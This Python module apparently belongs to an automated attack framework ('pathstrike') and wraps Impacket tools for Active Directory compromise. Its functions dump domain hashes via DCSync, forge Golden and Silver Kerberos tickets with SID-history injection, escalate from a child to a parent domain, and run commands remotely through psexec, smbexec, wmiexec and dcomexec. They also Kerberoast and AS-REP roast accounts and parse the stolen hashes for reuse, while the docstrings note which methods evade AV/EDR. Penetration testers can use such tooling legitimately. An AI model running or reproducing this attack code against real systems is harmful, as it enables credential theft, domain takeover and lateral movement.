"""Async subprocess wrapper for Impacket Python tools.

Wraps ``secretsdump.py``, ``getST.py``, ``getTGT.py``, ``psexec.py``,
``dcomexec.py``, and other Impacket scripts that are invoked as standalone
CLI programs.

Every public function returns a standardised result dict::

    {
        "success": bool,
        "output": str,       # raw stdout
        "error": str | None,  # stderr or exception message
    }
"""

from __future__ import annotations

import asyncio
import logging
import re
import shlex
from typing import Any

logger = logging.getLogger("pathstrike.tools.impacket")

# ---------------------------------------------------------------------------
# Core runner
# ---------------------------------------------------------------------------


async def run_impacket_tool(
    tool_name: str,
    args: list[str],
    timeout: int = 60,
) -> dict[str, Any]:
    """Run an Impacket tool by name and return captured output.

    The tool is invoked as ``<tool_name> [args]`` — i.e. the script must
    be on ``$PATH`` (which is the case after ``pip install impacket``).

    Args:
        tool_name: Impacket script name, e.g. ``"secretsdump.py"`` or ``"getST.py"``.
        args: CLI arguments for the tool.
        timeout: Maximum seconds to wait.

    Returns:
        Standardised result dict.
    """
    cmd = [tool_name, *args]
    logger.debug("Executing: %s", " ".join(shlex.quote(c) for c in cmd))

    result: dict[str, Any] = {
        "success": False,
        "output": "",
        "error": None,
        "tool": tool_name,
        "command": " ".join(shlex.quote(c) for c in cmd),
    }

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout_bytes, stderr_bytes = await asyncio.wait_for(
            proc.communicate(), timeout=timeout
        )

        stdout = stdout_bytes.decode("utf-8", errors="replace").strip()
        stderr = stderr_bytes.decode("utf-8", errors="replace").strip()

        result["output"] = stdout
        result["stderr"] = stderr
        result["return_code"] = proc.returncode

        if proc.returncode != 0:
            result["error"] = stderr or f"{tool_name} exited with code {proc.returncode}"
            logger.error("%s failed (rc=%d): %s", tool_name, proc.returncode, result["error"])
            return result

        result["success"] = True
        logger.debug("%s succeeded (%d bytes output)", tool_name, len(stdout))

    except asyncio.TimeoutError:
        result["error"] = f"{tool_name} timed out after {timeout}s"
        result["error_type"] = "timeout"
        logger.error(result["error"])
    except FileNotFoundError:
        result["error"] = (
            f"{tool_name} not found. Ensure Impacket is installed and scripts are on PATH."
        )
        result["error_type"] = "tool_not_found"
        logger.error(result["error"])
    except OSError as exc:
        result["error"] = f"OS error launching {tool_name}: {exc}"
        result["error_type"] = "os_error"
        logger.error(result["error"])

    return result


# ---------------------------------------------------------------------------
# Authentication argument builder
# ---------------------------------------------------------------------------


def build_impacket_auth(
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
    aes_key: str | None = None,
    ccache_path: str | None = None,
    dc_ip: str | None = None,
) -> list[str]:
    """Build Impacket-style authentication arguments.

    Impacket tools typically take ``domain/user:password@target`` as the
    first positional argument, plus optional flags for pass-the-hash,
    Kerberos, etc.

    Returns a list of CLI fragments that callers can extend with
    tool-specific arguments.
    """
    args: list[str] = []

    if ccache_path:
        # Kerberos authentication via ccache — set KRB5CCNAME externally
        args.extend(["-k", "-no-pass"])
        if dc_ip:
            args.extend(["-dc-ip", dc_ip])
        return args

    if aes_key:
        args.extend(["-aesKey", aes_key])
        if dc_ip:
            args.extend(["-dc-ip", dc_ip])
        return args

    if nt_hash:
        args.extend(["-hashes", f":{nt_hash}"])
        if dc_ip:
            args.extend(["-dc-ip", dc_ip])
        return args

    # Fallback: plaintext password (included in target string by caller)
    if dc_ip:
        args.extend(["-dc-ip", dc_ip])
    return args


def build_target_string(
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
    target_host: str | None = None,
) -> str:
    """Build the ``DOMAIN/user:password@target`` positional argument.

    If *nt_hash* is provided instead of a password, the password field
    is left empty (pass-the-hash uses ``-hashes`` flag separately).
    """
    cred_part = password if password and not nt_hash else ""
    base = f"{domain}/{username}:{cred_part}"
    if target_host:
        base = f"{base}@{target_host}"
    return base


# ---------------------------------------------------------------------------
# Convenience wrappers
# ---------------------------------------------------------------------------


async def secretsdump(
    target: str,
    auth_args: list[str],
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
    dc_ip: str | None = None,
    just_dc: bool = True,
    just_dc_user: str | None = None,
    timeout: int = 120,
) -> dict[str, Any]:
    """Run ``secretsdump.py`` to extract hashes from a target.

    Args:
        target: Target host (IP or FQDN).
        auth_args: Pre-built authentication flags (from :func:`build_impacket_auth`).
        domain: AD domain name.
        username: Authenticating user.
        password: Plaintext password (if applicable).
        nt_hash: NT hash (if applicable).
        dc_ip: Domain controller IP for Kerberos operations.
        just_dc: If True, perform DCSync only (``-just-dc``).
        just_dc_user: Extract only for this user (``-just-dc-user``).
        timeout: Maximum seconds.

    Returns:
        Result dict. On success, ``output`` contains the secretsdump output
        which can be parsed for NT hashes.
    """
    target_str = build_target_string(domain, username, password, nt_hash, target)

    args = [target_str, *auth_args]
    if just_dc:
        args.append("-just-dc")
    if just_dc_user:
        args.extend(["-just-dc-user", just_dc_user])

    result = await run_impacket_tool("secretsdump.py", args, timeout=timeout)

    # Post-process: extract NT hashes from output
    if result["success"]:
        result["hashes"] = _parse_secretsdump_hashes(result["output"])

    return result


def _parse_secretsdump_hashes(output: str) -> dict[str, str]:
    """Extract ``user:rid:lmhash:nthash:::`` lines from secretsdump output.

    Returns a dict mapping ``username`` -> ``nthash``.
    """
    hashes: dict[str, str] = {}
    # secretsdump format: domain\user:RID:LMHash:NTHash:::
    pattern = re.compile(
        r"^(?:.*\\)?(.+?):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::\s*$",
        re.MULTILINE,
    )
    for match in pattern.finditer(output):
        user = match.group(1)
        nt = match.group(4)
        hashes[user] = nt
    return hashes


async def get_st(
    spn: str,
    impersonate: str,
    auth_args: list[str],
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
    dc_ip: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Run ``getST.py`` to perform S4U2Self / S4U2Proxy and obtain a service ticket.

    Args:
        spn: Target service principal name (e.g. ``cifs/dc01.corp.local``).
        impersonate: User to impersonate via S4U.
        auth_args: Pre-built auth flags.
        domain: AD domain.
        username: Authenticating machine/user account.
        password: Plaintext password (if applicable).
        nt_hash: NT hash (if applicable).
        dc_ip: DC IP address.
        timeout: Maximum seconds.

    Returns:
        Result dict. On success, a ``.ccache`` file is written to the CWD.
    """
    target_str = build_target_string(domain, username, password, nt_hash)

    args = [
        target_str,
        "-spn",
        spn,
        "-impersonate",
        impersonate,
        *auth_args,
    ]
    if dc_ip:
        # Ensure dc-ip is present (may already be in auth_args)
        if "-dc-ip" not in auth_args:
            args.extend(["-dc-ip", dc_ip])

    return await run_impacket_tool("getST.py", args, timeout=timeout)


async def get_tgt(
    auth_args: list[str],
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
    dc_ip: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Run ``getTGT.py`` to request a TGT for the given principal.

    Returns:
        Result dict. On success, a ``.ccache`` file is written to the CWD.
    """
    target_str = build_target_string(domain, username, password, nt_hash)

    args = [target_str, *auth_args]
    if dc_ip and "-dc-ip" not in auth_args:
        args.extend(["-dc-ip", dc_ip])

    return await run_impacket_tool("getTGT.py", args, timeout=timeout)


async def ticketer(
    domain: str,
    domain_sid: str,
    nthash: str | None = None,
    aes_key: str | None = None,
    user: str = "Administrator",
    groups: str = "512,513,518,519,520",
    extra_sid: str | None = None,
    dc_ip: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Run ``ticketer.py`` to forge Kerberos tickets (Golden/Silver/Diamond).

    Creates a forged Kerberos ticket with the specified user and group
    memberships.  Used for Golden Ticket, Silver Ticket, and Diamond
    Ticket attacks.

    For child→parent domain escalation, pass *extra_sid* with the
    parent domain's Enterprise Admins SID (e.g. ``S-1-5-21-PARENT-519``)
    to inject SID History into the forged ticket PAC.

    Args:
        domain: AD domain name.
        domain_sid: Domain SID (e.g. ``S-1-5-21-...``).
        nthash: krbtgt NT hash for RC4 encryption.
        aes_key: krbtgt AES-256 key for AES encryption.
        user: Username to embed in the forged ticket.
        groups: Comma-separated group RIDs to include in the PAC.
        extra_sid: Additional SID to inject via SID History (for cross-domain
            escalation, e.g. ``S-1-5-21-PARENT-519`` for Enterprise Admins).
        dc_ip: Domain controller IP address.
        timeout: Maximum seconds to wait.

    Returns:
        Result dict.  On success, a ``.ccache`` file is written to the CWD.
    """
    args = [
        "-domain", domain,
        "-domain-sid", domain_sid,
    ]
    if nthash:
        args.extend(["-nthash", nthash])
    if aes_key:
        args.extend(["-aesKey", aes_key])
    args.extend(["-groups", groups])
    if extra_sid:
        args.extend(["-extra-sid", extra_sid])
    if dc_ip:
        args.extend(["-dc-ip", dc_ip])
    args.append(user)

    return await run_impacket_tool("ticketer.py", args, timeout=timeout)


async def raise_child(
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
    target_exec: str | None = None,
    dc_ip: str | None = None,
    timeout: int = 120,
) -> dict[str, Any]:
    """Run ``raiseChild.py`` to escalate from child to parent domain.

    This is impacket's one-shot child→parent escalation tool.  It
    automatically:
    1. Extracts the trust key for the parent domain
    2. Forges a Golden Ticket with Enterprise Admin SID History
    3. DCsyncs the parent domain
    4. Optionally gets a shell on the parent DC

    Args:
        domain: Child domain name (e.g. ``north.sevenkingdoms.local``).
        username: User in the child domain with DA or DCSync rights.
        password: Plaintext password.
        nt_hash: NT hash for pass-the-hash.
        target_exec: Parent DC to get a shell on (optional).
        dc_ip: Child domain DC IP.
        timeout: Maximum seconds (120 — this is a multi-step attack).

    Returns:
        Result dict with captured parent domain credentials.
    """
    target_str = build_target_string(domain, username, password, nt_hash)
    args = [target_str]

    if nt_hash:
        args.extend(["-hashes", f":{nt_hash}"])

    if target_exec:
        args.extend(["-target-exec", target_exec])

    # Note: raiseChild.py does NOT support -dc-ip (unlike other impacket tools).
    # It resolves the DC via DNS from the domain name.

    result = await run_impacket_tool("raiseChild.py", args, timeout=timeout)

    # Parse any hashes from raiseChild output
    if result["success"]:
        hashes = _parse_secretsdump_hashes(result.get("output", ""))
        if hashes:
            result["parsed"] = {"hashes": hashes}

    return result


async def dcomexec(
    target: str,
    command: str,
    auth_args: list[str],
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Run ``dcomexec.py`` to execute a command on a remote host via DCOM.

    Args:
        target: Target host IP or FQDN.
        command: Shell command to execute on the remote system.
        auth_args: Pre-built auth flags.
        domain: AD domain.
        username: Authenticating user.
        password: Plaintext password (if applicable).
        nt_hash: NT hash (if applicable).
        timeout: Maximum seconds.
    """
    target_str = build_target_string(domain, username, password, nt_hash, target)

    args = [target_str, *auth_args, command]

    return await run_impacket_tool("dcomexec.py", args, timeout=timeout)


async def psexec(
    target: str,
    command: str,
    auth_args: list[str],
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Run ``psexec.py`` to execute a command on a remote host via SMB/PSExec.

    Args:
        target: Target host IP or FQDN.
        command: Shell command to execute on the remote system.
        auth_args: Pre-built auth flags.
        domain: AD domain.
        username: Authenticating user.
        password: Plaintext password (if applicable).
        nt_hash: NT hash (if applicable).
        timeout: Maximum seconds.
    """
    target_str = build_target_string(domain, username, password, nt_hash, target)

    args = [target_str, *auth_args, command]

    return await run_impacket_tool("psexec.py", args, timeout=timeout)


async def smbexec(
    target: str,
    command: str,
    auth_args: list[str],
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Run ``smbexec.py`` for command execution via SMB.

    smbexec.py creates a Windows service on the remote host to execute
    commands.  Unlike PsExec, it does not upload a binary — instead it
    uses ``%COMSPEC%`` (cmd.exe) through a service, which may be less
    detected by AV/EDR.

    Args:
        target: Target host IP or FQDN.
        command: Shell command to execute on the remote system.
        auth_args: Pre-built auth flags.
        domain: AD domain.
        username: Authenticating user.
        password: Plaintext password (if applicable).
        nt_hash: NT hash (if applicable).
        timeout: Maximum seconds.

    Returns:
        Result dict with command output.
    """
    target_str = build_target_string(domain, username, password, nt_hash, target)
    args = [target_str, *auth_args, command]
    return await run_impacket_tool("smbexec.py", args, timeout=timeout)


async def wmiexec(
    target: str,
    command: str,
    auth_args: list[str],
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Run ``wmiexec.py`` for command execution via WMI.

    wmiexec.py uses Windows Management Instrumentation (WMI) to execute
    commands remotely.  Output is retrieved through SMB shares.  This
    method avoids creating a service or uploading files, making it
    stealthier than PsExec/SMBExec in some environments.

    Args:
        target: Target host IP or FQDN.
        command: Shell command to execute on the remote system.
        auth_args: Pre-built auth flags.
        domain: AD domain.
        username: Authenticating user.
        password: Plaintext password (if applicable).
        nt_hash: NT hash (if applicable).
        timeout: Maximum seconds.

    Returns:
        Result dict with command output.
    """
    target_str = build_target_string(domain, username, password, nt_hash, target)
    args = [target_str, *auth_args, command]
    return await run_impacket_tool("wmiexec.py", args, timeout=timeout)


async def kerberoast(
    auth_args: list[str],
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
    dc_ip: str | None = None,
    target_user: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Run ``GetUserSPNs.py`` to extract TGS hashes for Kerberoasting.

    Kerberoasting requests TGS tickets for accounts with registered
    SPNs.  The encrypted portion of these tickets can be cracked offline
    to recover plaintext passwords.

    Args:
        auth_args: Pre-built auth flags.
        domain: AD domain.
        username: Authenticating user.
        password: Plaintext password (if applicable).
        nt_hash: NT hash (if applicable).
        dc_ip: Domain controller IP address.
        target_user: Specific user to Kerberoast (omit for all SPN accounts).
        timeout: Maximum seconds.

    Returns:
        Result dict.  On success, ``output`` contains Kerberos TGS hashes
        in hashcat/John-compatible format.
    """
    target_str = build_target_string(domain, username, password, nt_hash)
    args = [target_str, *auth_args, "-request"]
    if target_user:
        args.extend(["-request-user", target_user])
    if dc_ip and "-dc-ip" not in auth_args:
        args.extend(["-dc-ip", dc_ip])
    result = await run_impacket_tool("GetUserSPNs.py", args, timeout=timeout)

    if result["success"]:
        result["parsed"] = {
            "tgs_hashes": _parse_kerberoast_hashes(result.get("output", "")),
        }

    return result


async def asreproast(
    domain: str,
    dc_ip: str | None = None,
    auth_args: list[str] | None = None,
    username: str | None = None,
    password: str | None = None,
    nt_hash: str | None = None,
    target_user: str | None = None,
    users_file: str | None = None,
    no_pass: bool = False,
    timeout: int = 60,
) -> dict[str, Any]:
    """Run ``GetNPUsers.py`` to extract AS-REP hashes for roasting.

    AS-REP roasting targets accounts with ``DONT_REQUIRE_PREAUTH``
    set.  The AS-REP response contains an encrypted portion that can
    be cracked offline.

    Args:
        domain: AD domain.
        dc_ip: Domain controller IP.
        auth_args: Pre-built auth flags (optional — can run unauthenticated).
        username: Authenticating user (optional for enumeration).
        password: Plaintext password.
        nt_hash: NT hash.
        target_user: Specific user to target (omit for all).
        users_file: File containing usernames to check.
        no_pass: Run without password (unauthenticated enumeration).
        timeout: Maximum seconds.

    Returns:
        Result dict.  On success, ``parsed["asrep_hashes"]`` contains
        extracted hashes.
    """
    if username:
        target_str = build_target_string(domain, username, password, nt_hash)
    else:
        target_str = f"{domain}/"

    args = [target_str, "-request"]

    if auth_args:
        args.extend(auth_args)

    if no_pass and "-no-pass" not in args:
        args.append("-no-pass")

    if target_user:
        # GetNPUsers uses -usersfile for specific users
        # For a single user, write to a temp approach or use the domain/user format
        args = [f"{domain}/{target_user}", "-request", "-no-pass"]
        if auth_args:
            args.extend(auth_args)

    if users_file:
        args.extend(["-usersfile", users_file])

    if dc_ip and (not auth_args or "-dc-ip" not in auth_args):
        args.extend(["-dc-ip", dc_ip])

    result = await run_impacket_tool("GetNPUsers.py", args, timeout=timeout)

    if result["success"]:
        result["parsed"] = {
            "asrep_hashes": _parse_asrep_hashes(result.get("output", "")),
        }

    return result


# ---------------------------------------------------------------------------
# Hash parsers
# ---------------------------------------------------------------------------


def _parse_kerberoast_hashes(output: str) -> list[dict[str, str]]:
    """Parse TGS hashes from GetUserSPNs.py output.

    Hashes follow the pattern::

        $krb5tgs$23$*user$REALM$domain/spn*$hex...

    Returns:
        List of dicts with ``username``, ``spn``, and ``hash`` keys.
    """
    results: list[dict[str, str]] = []
    for line in output.splitlines():
        line = line.strip()
        if line.startswith("$krb5tgs$"):
            # Extract username and SPN from the hash line
            # Format: $krb5tgs$23$*user$REALM$SPN*$...
            match = re.match(
                r"(\$krb5tgs\$\d+\$)\*([^$]+)\$([^$]+)\$([^*]+)\*\$(.*)",
                line,
            )
            if match:
                results.append({
                    "username": match.group(2),
                    "spn": match.group(4),
                    "hash": line,
                })
            else:
                # Fallback: store the full hash line
                results.append({"username": "unknown", "spn": "unknown", "hash": line})
    return results


def _parse_asrep_hashes(output: str) -> list[dict[str, str]]:
    """Parse AS-REP hashes from GetNPUsers.py output.

    Hashes follow the pattern::

        $krb5asrep$23$user@DOMAIN:hex...

    Returns:
        List of dicts with ``username`` and ``hash`` keys.
    """
    results: list[dict[str, str]] = []
    for line in output.splitlines():
        line = line.strip()
        if line.startswith("$krb5asrep$"):
            match = re.match(r"\$krb5asrep\$\d+\$([^@:]+)[@:]", line)
            username = match.group(1) if match else "unknown"
            results.append({"username": username, "hash": line})
    return results
